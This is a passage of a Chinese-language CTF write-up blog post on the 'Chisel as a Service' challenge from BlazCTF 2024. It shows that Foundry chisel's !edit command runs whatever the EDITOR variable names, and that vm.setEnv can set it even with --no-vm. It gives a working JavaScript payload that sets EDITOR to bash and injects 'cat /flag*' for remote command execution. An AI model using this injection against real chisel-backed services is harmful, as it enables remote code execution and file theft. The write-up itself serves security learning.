<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Edit =&gt; {</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// open the temp file with the editor</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">editor</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">"EDITOR"</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">"vim"</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(editor);</span><br><span class="line">    cmd.<span class="title function_ invoke__">arg</span>(&amp;temp_file_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> cmd.<span class="title function_ invoke__">status</span>() {</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>在有 vm 的 chisel 裡面得知 <code>vm</code> 的地址。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜ address(vm)</span><br><span class="line">Type: address</span><br><span class="line">└ Data: 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span><br></pre></td></tr></table></figure></div>

<p>可以看到確實在 <code>--no-vm</code> 的情況下可以正常設置環境變數。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; chisel --no-vm</span><br><span class="line">Welcome to Chisel! Type `!<span class="built_in">help</span>` to show available commands.</span><br><span class="line">➜ address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;</span><br><span class="line">➜ vm.call(abi.encodeWithSignature(<span class="string">"setEnv(string,string)"</span>, <span class="string">"EDITOR"</span>, <span class="string">"Ching367436"</span>));</span><br><span class="line">➜ !e <span class="built_in">env</span></span><br><span class="line">PWD=/home</span><br><span class="line">HOME=/root</span><br><span class="line">LC_ALL=en_US.UTF-8</span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line">TERM=xterm</span><br><span class="line">SHLVL=1</span><br><span class="line">HOSTNAME=25eeccf8b3b2</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.foundry/bin</span><br><span class="line">USER=root</span><br><span class="line">RUST_BACKTRACE=1</span><br><span class="line">EDITOR=Ching367436</span><br></pre></td></tr></table></figure></div>

<p>這種 RCE 方式的 argument 會有一個包含目前輸入過的 code 的文字檔的 path。</p>
<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ChiselCommand::Edit =&gt; {</span><br><span class="line">    <span class="comment">// create a temp file with the content of the run code</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">temp_file_path</span> = std::env::<span class="title function_ invoke__">temp_dir</span>();</span><br><span class="line">    temp_file_path.<span class="title function_ invoke__">push</span>(<span class="string">"chisel-tmp.sol"</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">result</span> = std::fs::File::<span class="title function_ invoke__">create</span>(&amp;temp_file_path)</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|<span class="keyword">mut</span> file| file.<span class="title function_ invoke__">write_all</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">source</span>().run_code.<span class="title function_ invoke__">as_bytes</span>()));</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = result {</span><br><span class="line">        <span class="keyword">return</span> DispatchResult::<span class="title function_ invoke__">CommandFailed</span>(<span class="built_in">format!</span>(</span><br><span class="line">            <span class="string">"Could not write to a temporary file: {e}"</span></span><br><span class="line">        ))</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open the temp file with the editor</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">editor</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">"EDITOR"</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">"vim"</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cmd</span> = Command::<span class="title function_ invoke__">new</span>(editor);</span><br><span class="line">    cmd.<span class="title function_ invoke__">arg</span>(&amp;temp_file_path);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>所以可以使用下方這個 payload 在當事網頁跑就會出現 flag。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">"run?code="</span>+<span class="built_in">encodeURIComponent</span><span class="string">`</span></span><br><span class="line"><span class="string">//;cat /flag*</span></span><br><span class="line"><span class="string">address vm = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;</span></span><br><span class="line"><span class="string">vm.call(abi.encodeWithSignature("setEnv(string,string)", "EDITOR", "bash"));</span></span><br><span class="line"><span class="string">!edit</span></span><br><span class="line"><span class="string">`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span>e.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span>location.<span class="property">hash</span>=e.<span class="property">uuid</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// blaz{m1na_b4k3_y0ur_pizza}</span></span><br></pre></td></tr></table></figure></div>


        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> BlazCTF 2024</li>
        <li><strong>Author:</strong> Ching367436</li>
        <li><strong>Created at
                :</strong> 2024-09-23 14:21:49</li>
        
        <li>
            <strong>Link:</strong> https://blog.ching367436.me/blazctf-2024/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/ctf/">#ctf</a>&nbsp;
                    </li>
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/blockchain/">#blockchain</a>&nbsp;
                    </li>
                
            </ul>
        

        
  <div class="recommended-article px-2 sm:px-6 md:px-8">
   <div class="recommended-desktop">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推薦閱讀</span>
    </div>
    <div class="recommended-article-group"><a class="recommended-article-item" href="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/" title="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation" rel="bookmark">
  <img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/cover.webp" alt="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation" class="!max-w-none">
  <span class="title">Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation</span>
</a><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
  <span class="title">AIS3 EOF 2024 Write-up</span>
</a><a class="recommended-article-item" href="/ais3-eof-2024-final/" title="AIS3 EOF 2024 Final" rel="bookmark">
  <img src="/ais3-eof-2024-final/TakeKitsune.webp" alt="AIS3 EOF 2024 Final" class="!max-w-none">
  <span class="title">AIS3 EOF 2024 Final</span>
</a></div>
   </div>
   <div class="recommended-mobile">
   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
     <i aria-hidden="true"></i><span>推薦閱讀</span>
   </div>
   <div class="recommended-article-group"><a class="recommended-article-item" href="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/" title="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation" rel="bookmark">
  <img src="/reversing-a-web3-scam-via-dynamic-analysis-and-deobfuscation/cover.webp" alt="Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation" class="!max-w-none">
  <span class="title">Reversing a Web3 Scam via Dynamic Analysis and Deobfuscation</span>
</a><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
  <span class="title">AIS3 EOF 2024 Write-up</span>
</a></div>
   </div>
  </div>

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/%E7%A5%9E%E7%9B%BE%E7%9B%83%E5%88%9D%E8%B3%BD-2024/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">神盾盃初賽 2024</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'Ching367436/blog',
                'data-repo-id': 'R_kgDOJNMXOw',
                'data-category': 'Giscus',
                'data-category-id': 'DIC_kwDOJNMXO84CVeVB',
                'data-mapping': 'title',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'en',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">BlazCTF 2024</div>
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ciao"><span class="nav-text">Ciao</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BigenLayer"><span class="nav-text">BigenLayer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tonyallet"><span class="nav-text">Tonyallet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cyber-Cartel"><span class="nav-text">Cyber Cartel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8Inch"><span class="nav-text">8Inch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chisel-as-a-Service"><span class="nav-text">Chisel as a Service</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        12 posts in total
                    </span>
                    
                        <span>
                            29.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="right-bottom-tools rss flex justify-center items-center">
                <a class="flex justify-center items-center"
                   href="/atom.xml"
                   target="_blank"
                >
                <i class="fa-regular fa-rss"></i>
                </a>
            </li>
        

        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="fa-regular fa-arrow-up"></i>
            </li>
        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog"></i>
        </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>






    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>



<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
